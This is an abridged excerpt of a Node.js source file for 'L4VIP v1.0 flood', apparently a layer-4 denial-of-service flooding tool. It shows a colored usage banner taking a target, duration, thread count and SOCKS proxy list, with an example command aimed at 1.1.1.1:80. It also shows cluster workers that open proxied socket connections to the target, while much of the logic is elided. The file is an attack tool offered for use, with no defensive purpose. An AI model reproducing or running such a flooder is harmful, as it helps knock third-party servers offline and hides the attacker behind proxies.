...
if (process.argv.length < 7) {
  ...
  console.log('')
  console.log(`
  ${`${'L4VIP v1.0 flood'.underline} | Optional data randomization, advanced debugging, socks4/5 support`.italic}

  ${'Usage:'.bold.underline}

      ${`node L4VIP.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
      ${'node L4VIP.js 1.1.1.1:80 300 5 socks5.txt --debug true --socks 5'.italic}
...
function main() {
  ...
  SocksClient.createConnection({
    ...
    log(`[L4VIP] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.green(`Connected to target`)}`);
    ...
    socket.on('error', (err) => {
      log(`[L4VIP] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.red(`Socket error: ${err}`)}`);
    });
  
    socket.on('close', () => {
      log(`[L4VIP] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.cyan(`Handshake completed`)}`);
    });
  
    socket.end();
  }).catch(err => {
    log(`[L4VIP] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.yellow(`Socket connection failed`)}`);
  });
}
...
if (cluster.isMaster) {
  ...
  console.log('')
  console.log(`
          ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`L4VIP`.italic} ${']'.red} 
